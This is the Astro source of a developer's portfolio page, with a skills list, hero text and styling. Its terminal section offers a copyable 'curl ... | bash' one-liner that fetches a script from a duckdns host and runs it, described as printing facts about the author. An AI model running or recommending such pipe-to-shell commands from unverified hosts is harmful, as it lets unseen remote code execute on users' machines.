---
import Layout from '../layouts/Layout.astro';
import Icon from '../components/Icon.astro';

import {
  siTypescript,
  siExpress,
  siDocker,
  siLinux,
  siRedis,
  siReact,
  siNextdotjs,
  siPython,
  siFastapi,
  siPostgresql,
  siMysql,
  siPrisma,
  siMongodb,
  siRedux,
  siSass,
  siTailwindcss,
  siGraphql,
  siNginx,
  siWeb3dotjs,
  siPrometheus,
  siGrafana,
  siSocketdotio,
  siRabbitmq,
  siApachekafka,
  siJest,
  siN8n,
  siGithubactions,
  siModelcontextprotocol,
  siJsonwebtokens,
} from "simple-icons";

const siIcon = (icon: any) => icon.path;


const technicalSkills = [
  // Languages
  { name: "TypeScript", icon: siIcon(siTypescript), color: "#3178C6" },
  { name: "Python", icon: siIcon(siPython), color: "#3776AB" },

  // Frontend / Fullstack Frameworks
  { name: "React", icon: siIcon(siReact), color: "#61DAFB" },
  { name: "Next.js", icon: siIcon(siNextdotjs), color: "#FFFFFF" },
  // { name: "React Native", icon: siIcon(siReact), color: "#61DAFB" },

  // Backend Frameworks
  { name: "Express.js", icon: siIcon(siExpress), color: "#FFFFFF" },
  { name: "FastAPI", icon: siIcon(siFastapi), color: "#009688" },

  // Auth / API
  { name: "JWT", icon: siIcon(siJsonwebtokens), color: "#F59E0B" },
  { name: "GraphQL", icon: siIcon(siGraphql), color: "#E10098" },

  // Databases / ORM
  { name: "PostgreSQL", icon: siIcon(siPostgresql), color: "#4169E1" },
  { name: "MySQL", icon: siIcon(siMysql), color: "#4479A1" },
  { name: "MongoDB", icon: siIcon(siMongodb), color: "#47A248" },
  { name: "Prisma", icon: siIcon(siPrisma), color: "#2D3748" },
  { name: "Redis", icon: siIcon(siRedis), color: "#DC382D" },

  // State / Styling
  { name: "Redux", icon: siIcon(siRedux), color: "#764ABC" },
  { name: "Sass", icon: siIcon(siSass), color: "#CC6699" },
  { name: "Tailwind CSS", icon: siIcon(siTailwindcss), color: "#06B6D4" },

  // Infra / DevOps
  { name: "Docker", icon: siIcon(siDocker), color: "#2496ED" },
  { name: "Linux", icon: siIcon(siLinux), color: "#FCC624" },
  { name: "CI/CD", icon: siIcon(siGithubactions), color: "#2088FF" },
  { name: "Nginx", icon: siIcon(siNginx), color: "#009639" },

  // Realtime / Messaging
  { name: "Socket.io", icon: siIcon(siSocketdotio), color: "#FFFFFF" },

  // { name: "Web3", icon: siIcon(siWeb3dotjs), color: "#F16822" },
  // { name: "Prometheus", icon: siIcon(siPrometheus), color: "#E6522C" },
  // { name: "Grafana", icon: siIcon(siGrafana), color: "#F46800" },
  // { name: "RabbitMQ", icon: siIcon(siRabbitmq), color: "#FF6600" },
  // { name: "Kafka", icon: siIcon(siApachekafka), color: "#FFFFFF" },
  // { name: "Jest", icon: siIcon(siJest), color: "#C21325" },

  // Platforms / Tooling
  { name: "MCP Server", icon: siIcon(siModelcontextprotocol), color: "#38BDF8" },
  { name: "n8n", icon: siIcon(siN8n), color: "#EA4B71" },
];
---

<Layout title="Divy Pathak">
  <div class="stars"></div>
  <div class="nebula"></div>

  <main class="container">
    <!-- Hero Section -->
    <header class="hero">
      <div class="penguLogo" aria-hidden="true">
        <img class="penguImg" src="/penguLogo.png" alt="pengu">
      </div>

      <h1 class="title"><span class="title-main">Divy Pathak</span></h1>

      <p class="tagline" id="tagline">Crafting Backends that don't break.</p>

      <p class="description">
        A developer who lives in the terminal, runs on coffee, builds on the web, and dreams like a footballer.
      </p>
    </header>

    <!-- Terminal -->
    <section class="terminal">
      <h2 class="section-title">
        <span class="red-accent">âŸ©</span> Know me better on your terminal
      </h2>
      <div class="code-block">
        <div class="code-header">
          <span class="code-dot"></span>
          <span class="code-dot"></span>
          <span class="code-dot"></span>
        </div>
        <div id="code-oneliner" class="code-content">
          <div class="code-line cmd">
            <span class="code-prompt">$</span>
            <span class="os-cmd">curl -fsSL https://nnnhub.duckdns.org/script.sh | bash</span>
            <button class="copy-line-btn" data-cmd="oneliner" title="Copy">
              <svg class="copy-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
              <svg class="check-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none"><polyline points="20 6 9 17 4 12"/></svg>
            </button>
          </div>
        </div>
      </div>
      <p class="quickstart-note">
        Works on Linux. On Windows use WSL/Git-bash terminal. The script logs about me on your terminal
      </p>
    </section>

    <script>
      const codeOneliner = document.getElementById('code-oneliner');

      const btn = document.querySelector(".copy-line-btn");
      btn.addEventListener('click', async () => {
        const code = "curl -fsSL https://nnnhub.duckdns.org/script.sh | bash";
        const copyIcon = btn.querySelector('.copy-icon');
        const checkIcon = btn.querySelector('.check-icon');

        try {
          await navigator.clipboard.writeText(code);
          btn.classList.add('copied');
          copyIcon.style.display = 'none';
          checkIcon.style.display = 'block';
          setTimeout(() => {
            btn.classList.remove('copied');
            copyIcon.style.display = 'block';
            checkIcon.style.display = 'none';
          }, 2000);
        } catch (err) {
          console.log("Failed to copy: ", err);
        }
      });
    </script>

    <!-- Tools and Skills -->
    <section class="technicalSkills">
      <h2 class="section-title">
        <span class="red-accent">âŸ©</span> Tools and Skills
      </h2>
      <div class="skills-row">
        {technicalSkills.map((p) => (
          <span class="skills-pill">
            <Icon icon={p.icon} color={p.color} size={16} />
            <span>{p.name}</span>
          </span>
        ))}
      </div>
    </section>

  </main>
</Layout>

<style>

  .red-accent {
    color: var(--coral-bright);
    font-weight: 700;
  }

  .section-title {
    font-family: var(--font-display);
    font-size: 1.4rem;
    font-weight: 600;
    margin-bottom: 0;
    display: flex;
    align-items: center;
    gap: 10px;
  }

  .stars,
  .stars::before,
  .stars::after {
    content: "";
    position: fixed;
    inset: 0;
    pointer-events: none;
    z-index: 0;
    will-change: transform, opacity;
  }

  /* Base star layer */
  .stars {
    background-image:
      radial-gradient(2px 2px at 20px 30px, rgba(255,255,255,0.9), transparent),
      radial-gradient(1px 1px at 90px 40px, rgba(255,255,255,0.7), transparent),
      radial-gradient(2px 2px at 130px 80px, rgba(255,255,255,0.6), transparent),
      radial-gradient(1px 1px at 160px 120px, rgba(255,255,255,0.8), transparent),
      radial-gradient(2px 2px at 200px 60px, rgba(0,229,204,0.8), transparent),
      radial-gradient(1px 1px at 250px 150px, rgba(255,255,255,0.6), transparent),
      radial-gradient(2px 2px at 300px 40px, rgba(255,77,77,0.6), transparent);
    background-size: 400px 250px;

    animation:
      stars-move 180s linear infinite,
      stars-twinkle 6s ease-in-out infinite alternate;
  }

  /* Smaller stars */
  .stars::before {
    background-image:
      radial-gradient(1px 1px at 50px 80px, rgba(255,255,255,0.8), transparent),
      radial-gradient(1px 1px at 150px 200px, rgba(255,255,255,0.6), transparent),
      radial-gradient(1px 1px at 300px 100px, rgba(255,255,255,0.7), transparent),
      radial-gradient(1px 1px at 400px 50px, rgba(0,229,204,0.7), transparent);
    background-size: 500px 300px;

    animation:
      stars-move-slow 260s linear infinite,
      stars-twinkle-fast 4s ease-in-out infinite alternate;
    opacity: 0.8;
  }

  /* Bigger stars */
  .stars::after {
    background-image:
      radial-gradient(3px 3px at 100px 150px, rgba(255,255,255,0.9), transparent),
      radial-gradient(2px 2px at 350px 200px, rgba(255,77,77,0.8), transparent),
      radial-gradient(3px 3px at 500px 80px, rgba(0,229,204,0.8), transparent);
    background-size: 600px 400px;

    animation:
      stars-move-fast 120s linear infinite,
      stars-twinkle-slow 9s ease-in-out infinite alternate;
    opacity: 0.7;
  }

  /* ðŸš€ GPU-friendly movement (transform only) */
  @keyframes stars-move {
    from { transform: translate3d(0, 0, 0); }
    to   { transform: translate3d(-300px, 150px, 0); }
  }

  @keyframes stars-move-slow {
    from { transform: translate3d(0, 0, 0); }
    to   { transform: translate3d(-200px, 100px, 0); }
  }

  @keyframes stars-move-fast {
    from { transform: translate3d(0, 0, 0); }
    to   { transform: translate3d(-400px, 200px, 0); }
  }

  /* âœ¨ Twinkle (opacity only = cheap) */
  @keyframes stars-twinkle {
    from { opacity: 0.5; }
    to   { opacity: 0.9; }
  }

  @keyframes stars-twinkle-fast {
    from { opacity: 0.4; }
    to   { opacity: 1; }
  }

  @keyframes stars-twinkle-slow {
    from { opacity: 0.6; }
    to   { opacity: 0.85; }
  }

  /* Nebula Gradient */
  .nebula {
    position: fixed;
    inset: 0;
    background:
      radial-gradient(ellipse 80% 50% at 20% 20%, rgba(255, 77, 77, 0.12), transparent 50%),
      radial-gradient(ellipse 60% 60% at 80% 30%, rgba(0, 229, 204, 0.08), transparent 50%),
      radial-gradient(ellipse 90% 70% at 50% 90%, rgba(255, 77, 77, 0.06), transparent 50%);
    pointer-events: none;
    z-index: 0;
  }

  .container {
    position: relative;
    z-index: 1;
    max-width: 860px;
    margin: 0 auto;
    padding: 60px 24px 40px;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }

  /* Hero */

  .hero {
    text-align: center;
    margin-bottom: 56px;
    animation: fadeInUp 0.8s ease-out;
  }

  @keyframes fadeInUp {
    from { opacity: 0;
      transform: translateY(20px);
    }
    to {
      opacity: 1;
      ransform: translateY(0);
    }
  }

  .penguLogo {
    width: 200px;
    height: auto;
    margin: 0 auto;
    animation: float 4s ease-in-out infinite;
    cursor: pointer;
    transition: transform 0.3s ease;
  }

  .penguLogo:hover {
    transform: scale(1.1);
    animation: none;
  }

  .penguLogo img {
    width: 100%;
    height: 100%;
    filter: drop-shadow(0 0 20px rgba(255, 55, 255, 0.2));
    transition: filter 0.3s ease;
  }

  @keyframes float {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-8px); }
  }

  .title {
    font-family: var(--font-display);
    font-size: clamp(3rem, 10vw, 4.5rem);
    font-weight: 700;
    letter-spacing: -0.03em;
    line-height: 1;
    margin-bottom: 12px;
  }

  .title-main {
    background: linear-gradient(135deg, var(--text-primary) 0%, var(--coral-bright) 50%, var(--cyan-bright) 100%);
    background-size: 200% 200%;
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    animation: gradientShift 6s ease infinite;
  }

  @keyframes gradientShift {
    0%, 100% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
  }

  .tagline {
    font-family: var(--font-display);
    font-size: 1.1rem;
    font-weight: 500;
    color: var(--coral-bright);
    letter-spacing: 0.15em;
    text-transform: uppercase;
    margin-bottom: 20px;
    animation: fadeInUp 0.8s ease-out 0.15s both;
  }

  .tagline.dalek-mode {
    color: var(--cyan-bright);
    animation: shake 0.1s ease-in-out infinite;
    text-shadow: 0 0 10px var(--cyan-glow);
  }

  @keyframes shake {
    0%, 100% { transform: translateX(0); }
    25% { transform: translateX(-2px); }
    75% { transform: translateX(2px); }
  }

  .description {
    font-size: 1.1rem;
    color: var(--text-secondary);
    max-width: 780px;
    margin: 0 auto;
    line-height: 1.7;
    animation: fadeInUp 0.8s ease-out 0.3s both;
  }

  /* Terminal */
  .terminal {
    margin-bottom: 56px;
    animation: fadeInUp 0.8s ease-out 0.6s both;
  }

  .code-block {
    background: var(--bg-elevated);
    border: 1px solid var(--border-subtle);
    border-radius: 12px;
    overflow: hidden;
  }

  .code-header {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 12px 16px;
    background: rgba(0, 0, 0, 0.3);
    border-bottom: 1px solid var(--border-subtle);
  }

  .code-content {
    padding: 16px 20px;
    font-family: 'SF Mono', 'Fira Code', 'Consolas', monospace;
    font-size: 0.9rem;
    line-height: 1.6;
  }

  .code-line {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 4px 0;
  }

  .code-line.comment {
    color: var(--text-muted);
    font-style: italic;
  }

  .code-line.cmd {
    color: var(--text-primary);
  }

  .copy-line-btn {
    opacity: 0.6;
    margin-left: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    width: 28px;
    height: 28px;
    border: none;
    border-radius: 6px;
    background: rgba(255, 255, 255, 0.1);
    color: var(--text-muted);
    cursor: pointer;
    transition: all 0.2s ease;
    flex-shrink: 0;
  }

  .code-line:hover .copy-line-btn {
    opacity: 1;
  }

  .copy-line-btn:hover {
    background: rgba(255, 255, 255, 0.2);
    color: var(--text-primary);
  }

  .copy-line-btn.copied {
    opacity: 1;
    background: rgba(0, 229, 204, 0.2);
    color: var(--cyan-bright);
  }

  .copy-line-btn svg {
    width: 14px;
    height: 14px;
  }

  .code-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
    background: var(--text-muted);
  }

  .code-dot:nth-child(1) { background: #ff5f57; }
  .code-dot:nth-child(2) { background: #febc2e; }
  .code-dot:nth-child(3) { background: #28c840; }

  .quickstart-note {
    margin-top: 16px;
    font-size: 0.9rem;
    color: var(--text-muted);
    text-align: center;
  }

  /* Tools and Skills */
  .technicalSkills {
    margin-bottom: 56px;
    animation: fadeInUp 0.8s ease-out 0.6s both;
  }

  .skills-row {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    justify-content: center;
    margin-bottom: 16px;
  }

  .skills-pill {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 8px 14px;
    border-radius: 20px;
    border: 1px solid var(--border-subtle);
    background: rgba(10, 15, 26, 0.6);
    backdrop-filter: blur(8px);
    font-size: 0.85rem;
    color: var(--text-secondary);
    transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
    cursor: default;

  }


  .skills-pill :global(svg) {
    width: 16px;
    height: 16px;
    flex-shrink: 0;
    transition: all 0.2s ease;
  }

  .skills-pill:hover {
    border-color: var(--coral-bright);
    transform: translateY(-4px);
    box-shadow: 0 8px 24px color-mix(in srgb, var(--coral-bright) 20%, transparent);
  }


</style>
